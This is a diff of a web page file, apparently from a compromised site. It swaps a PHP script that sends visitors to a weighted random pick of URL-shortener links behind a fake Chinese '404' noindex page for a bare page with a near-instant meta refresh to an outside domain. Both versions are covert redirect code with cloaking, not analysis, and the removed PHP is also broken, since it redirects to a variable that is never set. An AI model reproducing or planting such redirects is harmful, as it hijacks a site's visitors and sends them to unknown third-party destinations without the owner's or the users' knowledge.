@@ -1,44 +1,16 @@
-<?php
-include('robots.php');
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" " http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 
-$urldata = array(
-    array('url'=>'http://mrw.so/5QvuGN',      'weights'=>1),
-    array('url'=>'http://s.id/nwniK',              'weights'=>2),
-    array('url'=>'http://6tt.co/sS5V',  'weights'=>3),
-    array('url'=>'http://33h.co/fLcb',  'weights'=>4),
-    array('url'=>'http://8nn.co/b8Ff',  'weights'=>5),
-    array('url'=>'http://8rr.co/JtyY',  'weights'=>6)
-    
-    #array('url'=>'http://japan-rakuten.website',             'weights'=>0),
-   
-);
+<html xmlns=" http://www.w3.org/1999/xhtml">
 
-echo $tz_url;
+<head>
 
-header("location:".$tz_url);
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" /><meta http-equiv="Content-Language" content="zh-CN">
 
-function getConsultant(array $data){
-    $weight = 0;
-    $users = array();
-    foreach ($data as $one) {
-        $oneWeight = (int)$one['weights'] ? $one['weights'] : 1;
-        $weight += $oneWeight;
-        for ($i = 0; $i < $oneWeight; $i ++) {
-            $users[] = $one;
-        }
-    }
-    return $users[rand(0, $weight-1)];
-}
+<meta HTTP-EQUIV="Content-Type"CONTENT="text/html; charset=gb2312"><meta http-equiv="refresh"content="0.1;url= http://www.cnvzz.cn">
+</head>
 
-?>
+<body>
 
-<html xmlns="http://www.w3.org/1999/xhtml" xmlns:pt="http://xmlns.jcp.org/jsf/passthrough">
-    <head>
-        <meta name="googlebot" content="noindex">
-        <META NAME="ROBOTS" CONTENT="NOINDEX,NOFOLLOW">
-        <meta name="ROBOTS" content="NOINDEX,NOFOLLOW">
-    </head>
-    <body>
-        <h3>404，您请求的文件不存在!</h3>
-    </body>
+</body>
+
 </html>
